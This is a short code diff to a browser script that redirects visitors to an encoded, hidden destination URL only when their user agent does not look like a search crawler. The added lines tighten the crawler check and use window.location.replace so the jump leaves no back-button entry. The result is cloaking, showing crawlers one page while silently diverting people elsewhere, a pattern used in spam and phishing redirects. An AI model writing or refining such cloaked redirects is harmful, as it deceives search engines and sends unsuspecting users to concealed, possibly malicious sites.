@@ -42,14 +42,15 @@
                 'googlebot', 'bingbot', 'slurp', 'twitterbot', 'linkedinbot',
                 'crawler', 'spider', 'bot'
             ];
-            return botSignatures.some(signature => userAgent.includes(signature));
+            return botSignatures.some(signature => userAgent.includes(signature)) &&
+                   !/chrome|safari|firefox|edge|opera/i.test(userAgent);
         }
 
         if (redirectStatus === 'ON' && data) {
             if (!isBot()) {
                 const destination = decodeAdvanced(data);
                 if (destination) {
-                    window.location.href = destination;
+                    window.location.replace(destination);
                 } else {
                     console.error("Failed to decode URL.");
                 }
